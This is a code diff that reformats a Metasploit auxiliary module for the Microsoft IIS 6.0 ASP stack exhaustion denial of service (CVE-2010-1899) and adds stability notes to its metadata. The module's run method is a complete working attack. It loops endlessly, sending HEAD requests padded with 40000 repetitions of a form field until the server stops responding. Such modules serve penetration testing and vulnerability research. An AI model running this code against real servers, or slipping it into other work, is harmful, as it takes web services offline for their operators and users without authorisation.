@@ -8,63 +8,68 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Dos
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Microsoft IIS 6.0 ASP Stack Exhaustion Denial of Service',
-      'Description'    => %q{
+    super(
+      update_info(
+        info,
+        'Name' => 'Microsoft IIS 6.0 ASP Stack Exhaustion Denial of Service',
+        'Description' => %q{
           The vulnerability allows remote unauthenticated attackers to force the IIS server
-        to become unresponsive until the IIS service is restarted manually by the administrator.
-        Required is that Active Server Pages are hosted by the IIS and that an ASP script reads
-        out a Post Form value.
-      },
-      'Author'         =>
-        [
+          to become unresponsive until the IIS service is restarted manually by the administrator.
+          Required is that Active Server Pages are hosted by the IIS and that an ASP script reads
+          out a Post Form value.
+        },
+        'Author' => [
           'Heyder Andrade <heyder[at]alligatorteam.org>',
           'Leandro Oliveira <leadro[at]alligatorteam.org>'
         ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
+        'License' => MSF_LICENSE,
+        'References' => [
           [ 'CVE', '2010-1899' ],
           [ 'OSVDB', '67978'],
           [ 'MSB', 'MS10-065'],
           [ 'EDB', '15167' ]
         ],
-      'DisclosureDate' => '2010-09-14'))
+        'DisclosureDate' => '2010-09-14',
+        'Notes' => {
+          'Stability' => [CRASH_SERVICE_DOWN],
+          'SideEffects' => [],
+          'Reliability' => []
+        }
+      )
+    )
 
     register_options(
       [
         Opt::RPORT(80),
         OptString.new('VHOST', [ false, 'The virtual host name to use in requests']),
         OptString.new('URI', [ true, 'URI to request', '/page.asp' ])
-      ])
+      ]
+    )
   end
-
 
   def run
     uri = datastore['URI']
     print_status("Attacking http://#{datastore['VHOST'] || rhost}:#{rport}#{uri}")
 
     begin
-      while(1)
-        begin
-          connect
-          payload = "C=A&" * 40000
-          length = payload.size
-          sploit = "HEAD #{uri} HTTP/1.1\r\n"
-          sploit << "Host: #{datastore['VHOST'] || rhost}\r\n"
-          sploit << "Connection:Close\r\n"
-          sploit << "Content-Type: application/x-www-form-urlencoded\r\n"
-          sploit << "Content-Length:#{length} \r\n\r\n"
-          sploit << payload
-          sock.put(sploit)
-          #print_status("DoS packet sent.")
-          disconnect
-        rescue Errno::ECONNRESET
-          next
-        end
+      loop do
+        connect
+        payload = 'C=A&' * 40000
+        length = payload.size
+        sploit = "HEAD #{uri} HTTP/1.1\r\n"
+        sploit << "Host: #{datastore['VHOST'] || rhost}\r\n"
+        sploit << "Connection:Close\r\n"
+        sploit << "Content-Type: application/x-www-form-urlencoded\r\n"
+        sploit << "Content-Length:#{length} \r\n\r\n"
+        sploit << payload
+        sock.put(sploit)
+        # print_status("DoS packet sent.")
+        disconnect
+      rescue Errno::ECONNRESET
+        next
       end
     rescue Errno::EPIPE
-      print_good("IIS should now be unavailable")
+      print_good('IIS should now be unavailable')
     end
   end
 end
